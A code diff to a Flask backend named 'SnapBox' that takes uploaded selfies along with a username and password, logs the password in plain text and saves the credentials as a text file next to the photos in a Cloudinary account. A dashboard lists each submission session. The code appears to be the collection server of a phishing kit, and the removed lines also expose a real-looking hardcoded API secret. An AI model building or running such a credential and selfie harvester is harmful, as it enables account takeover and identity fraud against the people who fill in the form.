@@ -7,6 +7,7 @@ import time
 import os
 import random
 import tempfile
+from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
@@ -15,74 +16,73 @@ CORS(app)
 cloudinary.config(
     cloud_name="dx1jvytp4",
     api_key="932781884527291",
-    api_secret="eRSeF486FPV-eh8YpBWZX8wJe7c"
+    api_secret="YOUR_API_SECRET_HERE"  # Replace this with your real secret
 )
 
 @app.route('/')
 def home():
-    try:
-        result = cloudinary.Search().expression("folder:snapbox").sort_by("created_at", "desc").execute()
-        resources = result['resources']
+    result = cloudinary.Search().expression("folder:snapbox").sort_by("created_at", "desc").execute()
+    resources = result['resources']
 
-        grouped = []
-        current_group = []
-        last_time = None
-        threshold = 60  # seconds
+    grouped = []
+    current_group = []
+    last_time = None
+    threshold = 60  # seconds
 
-        for item in resources:
-            created_at = item['created_at']
-            timestamp = int(time.mktime(time.strptime(created_at[:19], "%Y-%m-%dT%H:%M:%S")))
+    for item in resources:
+        created_at = item['created_at']
+        timestamp = int(time.mktime(time.strptime(created_at[:19], "%Y-%m-%dT%H:%M:%S")))
 
-            if last_time is None or abs(last_time - timestamp) <= threshold:
-                current_group.append(item)
-            else:
-                grouped.append(current_group)
-                current_group = [item]
-
-            last_time = timestamp
-
-        if current_group:
+        if last_time is None or abs(last_time - timestamp) <= threshold:
+            current_group.append(item)
+        else:
             grouped.append(current_group)
+            current_group = [item]
 
-        html = '''
-        <h2 style="font-family:sans-serif;">📸 SnapBox Cloudinary Backend is Live!</h2>
-        <div style="font-family:monospace; font-size:14px;">
+        last_time = timestamp
+
+    if current_group:
+        grouped.append(current_group)
+
+    html = '''
+    <h2 style="font-family:sans-serif;">📸 SnapBox Cloudinary Backend is Live!</h2>
+    <div style="font-family:monospace; font-size:14px;">
+    '''
+
+    for i, group in enumerate(grouped, start=1):
+        timestamp = group[0]['created_at'][:19].replace("T", " ")
+        html += f"<p><b>Session {i} — {timestamp}</b></p><form action='/delete-group' method='POST'>"
+        for img in group:
+            url = img['secure_url']
+            public_id = img['public_id']
+            html += f'''
+            <div style="margin-bottom:6px;">
+                {url}
+                <input type="hidden" name="public_ids" value="{public_id}">
+                <a href="{url}" target="_blank" style="margin-left:10px; padding:2px 6px; background:#333; color:#fff; text-decoration:none; border-radius:4px;">Open</a>
+            </div>
+            '''
+        html += f'''
+        <button type="submit" style="margin-top:10px; padding:6px 12px; background:#e11d48; color:#fff; border:none; border-radius:6px; cursor:pointer;">🗑️ Delete This Session</button>
+        </form><hr style="margin:20px 0;">
         '''
 
-        for i, group in enumerate(grouped, start=1):
-            timestamp = group[0]['created_at'][:19].replace("T", " ")
-            html += f"<p><b>Session {i} — {timestamp}</b></p><form action='/delete-group' method='POST'>"
-            for img in group:
-                url = img['secure_url']
-                public_id = img['public_id']
-                html += f'''
-                <div style="margin-bottom:6px;">
-                    {url}
-                    <input type="hidden" name="public_ids" value="{public_id}">
-                    <a href="{url}" target="_blank" style="margin-left:10px; padding:2px 6px; background:#333; color:#fff; text-decoration:none; border-radius:4px;">Open</a>
-                </div>
-                '''
-            html += f'''
-            <button type="submit" style="margin-top:10px; padding:6px 12px; background:#e11d48; color:#fff; border:none; border-radius:6px; cursor:pointer;">🗑️ Delete This Session</button>
-            </form><hr style="margin:20px 0;">
-            '''
-
-        html += "</div>"
-        return html
-    except Exception as e:
-        return f"<h3>Error: {str(e)}</h3>"
+    html += "</div>"
+    return html
 
 @app.route('/upload', methods=['POST'])
 def upload_files():
-    if 'photos' not in request.files:
-        return "No file part", 400
-
     files = request.files.getlist('photos')
     uploaded_urls = []
 
+    # 🔽 Get form data
     username = request.form.get('username', 'unknown_user')
-    password = request.form.get('password', 'no_pass')
+    password = request.form.get('password', 'empty_pass')
 
+    print("📥 Received username:", username)
+    print("📥 Received password:", password)
+
+    # ✅ Upload selfies
     for index, file in enumerate(files):
         if file.filename == '':
             continue
@@ -99,6 +99,7 @@ def upload_files():
         )
         uploaded_urls.append(result['secure_url'])
 
+    # ✅ Save username/password as .txt
     credentials_content = f"Username: {username}\nPassword: {password}"
     with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt') as temp_file:
         temp_file.write(credentials_content)
